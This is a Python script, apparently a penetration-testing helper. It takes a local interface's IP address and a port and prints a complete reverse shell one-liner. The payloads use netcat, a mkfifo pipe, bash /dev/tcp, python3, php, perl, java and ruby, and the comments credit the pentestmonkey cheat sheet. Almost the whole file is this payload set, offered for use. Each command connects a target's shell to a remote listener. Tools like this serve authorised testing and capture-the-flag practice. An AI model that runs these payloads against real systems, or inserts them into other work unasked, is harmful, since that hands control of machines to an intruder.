#!/usr/bin/python3
"""
Just something to make my life easier :)
PS. This is my attempt at trying to make code as unreadable as possible
"""
import netifaces as ni
from colorama import Fore
import argparse


def main():
    global args
    parser = argparse.ArgumentParser(description='Get some options')
    parser.add_argument('-i', '--interface', type=str, default="tun0",help="Use the specified interface as LHOST")
    parser.add_argument('-p', '--lport', type=str, default="443",help="Use the specified LPORT")
    parser.add_argument('-P', '--Payload', type=int, nargs="?", default=1,help="Use the specified Payload. List payloads using `-l payloads`")
    parser.add_argument('-l', '--list', type=str, help="List payloads/interfaces")
    args = parser.parse_args()
    if args.list:
        listh()
    else:
        rev_payload()

"""Just list out the interfaces or the payloads
"""
def listh():
    if args.list == "payloads":
        payload_types = ["netcat", "old-netcat [more reliable]", "bash", "python3", "php", "perl", "java", "ruby"]
        print(Fore.MAGENTA + "==================================")
        print(Fore.MAGENTA + "|      Choose the payload        |")
        print(Fore.MAGENTA + "==================================")
        print(Fore.GREEN + "\n".join(
            [str(payload) + "." + payload_types[payload] for payload in range(len(payload_types))]))
    elif args.list == "interfaces":
        print(Fore.GREEN + "\n".join(
        [str(interface) + "." + ni.interfaces()[interface] for interface in range(len(ni.interfaces()))]))

"""All of the payloads have been shamelessly fetched from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
"""
def rev_payload():
    ip = ''
    payload_types = ["netcat", "old-netcat [more reliable]", "bash", "python3", "php", "perl", "java", "ruby"]
    for index, interface in enumerate(ni.interfaces()):
        if interface == args.interface:
            ip = ni.ifaddresses(ni.interfaces()[index])[ni.AF_INET][0]['addr']
    if not ip:
        print(Fore.RED, end="")
        raise Exception("Interface does not exist")
    # A list of payloads with the string formatted to include the ip and the port
    payloads = [f"nc -e /bin/sh {ip} {args.lport}", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {args.lport} >/tmp/f", f"bash -i >& /dev/tcp/{ip}/{args.lport} 0>&1",
                f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{args.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                f"php -r '$sock=fsockopen(\"{ip}\",{args.lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", f"perl -e 'use Socket;$i=\"{ip}\";$p={args.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))" + "{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{args.lport};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\np.waitFor()",
                f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{args.lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"]
    if args.Payload < len(payloads):
        print(Fore.GREEN + "============= Payload ===============")
        print("Using the payload: " + payload_types[args.Payload])
        print(payloads[args.Payload])
    else:
        print(Fore.RED, end="")
        raise Exception("Provide the right payload index")

if __name__ == "__main__":
    main()
